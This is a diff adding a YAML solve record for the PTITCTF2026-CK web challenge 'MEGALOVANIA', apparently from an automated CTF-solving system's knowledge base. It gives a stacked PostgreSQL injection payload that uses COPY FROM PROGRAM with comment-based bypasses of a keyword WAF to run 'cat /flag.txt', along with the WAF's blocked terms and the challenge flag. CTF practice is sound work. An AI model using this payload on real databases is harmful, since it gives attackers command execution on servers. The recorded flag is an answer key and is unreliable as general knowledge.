@@ -1,0 +1,45 @@
+id: ptitctf2026ck_megalovania
+event: PTITCTF2026-CK
+category: web/sqli-postgres-copy-program
+challenge_name: MEGALOVANIA
+status: solved
+flag: "PTITCTF{https://youtu.be/0FCvzsVlXpQ?si=always_wondered_why_people_never_use_their_strongest_attack_first_984ac2fdefcb}"
+confidence: 1.0
+artifact_hashes:
+  - "app.py sha256=DD4E8F969DB666CCBA246AEAA61CD82DA6F27E95F56EB59DAF1E58CEA30870D0"
+  - "init.sql sha256=AD1E9F98AC07269D09BBE89950029ED1436843FD631EA74A653E8E53C43B9327"
+  - "entrypoint.sh sha256=5471659DF0D90E7B963523F04217581C11C6FF96637CD185EED906015C92F532"
+signals:
+  - "Construct 3 Sans fight posts JSON deaths to /count"
+  - "stacked SQLi, last statement rows returned as lines"
+  - "PostgreSQL superuser; WAF blocks COPY + space, FROM PROGRAM, CREATE TABLE, pg_"
+key_idea: "CREATE TEMP TABLE is not CREATE TABLE; COPY/**/ FROM/**/PROGRAM bypasses whitespace-phrase WAF; dump /flag.txt in the same stacked query."
+prerequisites:
+  - stacked queries enabled (psycopg2 execute)
+  - superuser or pg_execute_server_program
+exploitation_pattern: "0; CREATE TEMP TABLE o(x text); COPY/**/ o FROM/**/PROGRAM 'cat /flag.txt'; SELECT x FROM o --"
+verification:
+  method: "Two independent COPY FROM PROGRAM cat /flag.txt on live 144.79.188.39:47082; ls / showed flag.txt; entrypoint.sh writes GZCTF_FLAG there"
+  evidence: "OUTPUT/ptitctf2026ck_megalovania/raw/remote_flag.txt"
+pitfalls:
+  - "COPY into dialogue (line) fails: refight and seq are NOT NULL without defaults"
+  - "information/**/_schema is invalid SQL; the WAF matches the identifier as one token"
+  - "Flag is not in the database"
+failed_paths:
+  - "dump dialogue"
+  - "pg_/information_schema enum"
+  - "COPY dialogue (line) FROM PROGRAM"
+  - "lo_get(lo_import('/flag.txt')) as last SELECT"
+tools:
+  - Python 3
+  - sockets
+playbook: PLAYBOOKS/web_sqli.md
+writeup: D:/download/ctf-ai-system/OUTPUT/_archive/PTITCTF2026-CK/Web/MEGALOVANIA/writeup/writeup.md
+solver: D:/download/ctf-ai-system/OUTPUT/_archive/PTITCTF2026-CK/Web/MEGALOVANIA/solve/solve.py
+time_heuristic: "Stacked SQLi + postgres superuser → CREATE TEMP + COPY FROM PROGRAM before catalog enum."
+last_verified: "2026-09-14"
+hexstrike:
+  used: false
+  useful: false
+  notes: ""
+sources: []
